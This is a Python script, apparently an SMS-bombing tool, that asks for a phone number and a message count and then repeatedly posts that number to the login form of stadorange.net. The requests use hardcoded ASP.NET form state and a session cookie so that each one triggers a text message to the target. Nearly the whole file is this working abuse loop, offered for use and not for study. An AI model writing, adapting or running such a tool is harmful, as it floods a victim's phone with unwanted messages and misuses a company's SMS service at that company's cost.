# = = = = = = = = = = = = «COLOR» = = = = = = = = = = = #

R     ="\033[1;31m"      # Red
G     ="\033[1;32m"      # Green
Y     ="\033[1;33m"      # Yellow
B     ="\033[1;34m"      # Blue
P     ="\033[1;35m"      # Purple
C     ="\033[1;36m"      # Cyan
W    ="\033[1;37m"      # White
R1   = '\033[2;31m'      #Red_2
P1   = '\033[2;35m'      # Pink
LB   = '\033[2;36m'      # Cloud 
L      = '\033[1;34m    ' # Light_Blue

# = = = = = = = = = = = = «LIBRARY» = = = = = = = = = = = #

import uuid,random,user_agent,datetime,string,time,threading,json,secrets,subprocess,hashlib
import requests, pyfiglet, termcolor, sys, os, webbrowser as time, datetime, time
from random import *
from user_agent import generate_user_agent
from datetime import datetime
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
from colorama import Fore, Style
from uuid import uuid4
from secrets import token_hex
from bs4 import BeautifulSoup
aa = 0
zz = 0
a = 0

# = = = = = = = = = = = = = = = = = = = = = = = 
try:
	num = input(f'{W}Enter Phone Number {P}:{C} ')
	count = int(input(f'{W}Enter Number Of Messages {P}:{C} '))
except:
	print()
	print('\033[1;31mwrong entry')
	exit('\033[1;39m')
print()

op = 0
while op<count:
    hd = {"Host": "stadorange.net", "Connection": "keep-alive",
"Content-Length": "1800", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://stadorange.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 DuckDuckGo/5 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "X-Requested-With": "com.duckduckgo.mobile.android",
"Referer": "http://stadorange.net/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7", "Cookie": "ASP.NET_SessionId=sgc2ppearhfm2p1z03qsysmm"}
  
    url = 'http://stadorange.net/login'

    data = {"__LASTFOCUS":"", "__EVENTTARGET":"", "__EVENTARGUMENT":"", "__VIEWSTATE":"DvdgP8ASNBDPfGf9Qi3zNhKWnQ32de3d2CQ1anFE4vaGrYl+bH6sImakgGr812sTGt8UP/8jbzlz9BomARBEzX5m8eM+9lVJlrMCzQTYpw2SADUZfKeMqXTV+2aRE+mSm7mmO5cyhtExnl1CL5zain+2e5tErqUziGGRMlYbdWtiIQ1ome3lSQqb7eLAkLut5ilrumpLVIaZSktHbGUo14Bn/ApBWi07sHwJUTvaIqZYDwWLRt1CT4YdPQIGzeTnd2MdNY1w0LhEfyscNxh7qGED6nK5PCmV2dvu9UsfOPf8ZdRVX4AIPVm9IukzbSAxyjd/iU45tHUbxh779ZbbfwjwKo3VPID/49i1MI7xkTaVkJk2oncVpPra0MMHWIupu+x9QvaPb/3hWW0kqBzt2US0VnQTbL4km/Q4NoQx59pMBbn8bTt+O25X97dUJqSkeelK8yf9OqqMByCKWjijvRDBMVZR8se4f2TqW6yQaJWJzimKVLxJI/Ec5IfEzbnLItD/7Yjm2hPAyowoVWpdBrHT32bHnGETfyV1QlyFZ1z2fABgcfDyU48MZN6IkAy4CFLDZy0PbF9iak67C2JZW+C5D+PugPeqnDYe1uQG9Xlu86aGsW0D+T8szr/64P8AtY+NXjrzS0SvUqLO6RZRuCrVuhtTKN2F4xr4Wfd8sn7hhmeiq9nEEYk4Z360DGt9/NOKRAEJBCi10XfevD2GPxqGSpZ3d9KiOTLdBzmEiGySCIA/Eyx1XQNh3Mgf3XnCnUrO1fnNyIiQf8VI/SpMOHrTNPE1bktch58oUUBeQM56xfXmy9Nqom6c0+P67s+chguwwy0FMLg0aMlMnTyeSoNoNdjHT0zW1YrD0SdcTzfiDtI+kA+pyyMxBoHZPkyAH8fceQrJ7qdtWJqyhDDJYytkZUlDLlIOYJecDKbvB+K6D6Cd0Z6YHBJL78qkEo84wcCPV0GjNWaed4X8OO0QS5hnemrFVYXy4CkWR+anHMa61tj+bb6yGdbTi2OtYQ4bNNyZKVhfaBe5+BHcONysZnuZgYFOnTtSnWmJUKdtjxePd7zY7NDBso1Z+i3lk0NKiIKMaog5elRH8Tnx1onwcpUFTXFL1mtsZoyCssaMKvA7wBwHuiScPG6CFoZQE+BGGBKCevHyRIlJ+EPkaqptJ/KGpxLKa2vc0ngNOnmJL/8ZG3g+gHy+uDj/FDlnSDJ667AGOgLv8SFUZZ2AQw/o8Ki/QO46D1WzLysVSPn0bqjuNGMRW4fJkoVLW59iZ3N1VEEr6H53o9pUyXYmK4IGWVa8C3d4z8v83tvk5GOqwYpf94yDxhsWiOGsrV5ptzNO", "__VIEWSTATEGENERATOR": "C2EE9ABB", "__EVENTVALIDATION":	"UD7tj8FgjETYOA8/MNTZiJeroQPzjd1d6kQCsGSoHqbwxFkIVTqBXJ3r6eSJsGrPhGToRjJcu0irdz7rJ+qyPQIZYK0bkDoMeMgGJYiv2Ww7btVu3/IxViVAWrWft2JtERcXVW1sM1Or0zO2HBL2eg==", "ctl00$contentBody$txtPhone":num, "ctl00$contentBody$btnSubmit": "تأكيد"}

    r = requests.post(url, headers=hd, data=data).text
    op = op + 1
    if str("تأكيد") in r:
    	print(f'{P}• {G}Done Send Sms {R}{op}')
    else:
    		print(f"{R}• There's a mistake")
    		print('')
    		exit()

print('')